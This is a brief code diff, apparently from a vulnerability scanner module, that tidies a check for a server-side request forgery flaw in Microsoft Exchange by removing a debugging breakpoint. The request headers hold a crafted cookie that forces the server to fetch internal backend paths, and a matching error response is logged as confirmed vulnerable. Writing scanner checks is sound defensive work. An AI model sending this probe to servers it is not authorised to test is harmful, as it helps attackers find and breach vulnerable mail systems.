@@ -65,12 +65,10 @@ module Intrigue
               "User-Agent" => "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0",
               "Cookie" => "X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;"
             }
-            
+
             res = http_request :get, uri, nil, headers
             if res.code.to_i == 500 && res.body_utf8 =~ /NegotiateSecurityContext/
               _log "Vulnerable! SSRF successful and this is a confirmed issue."
-              require 'pry';
-              binding.pry
               return res.body_utf8
             end
 
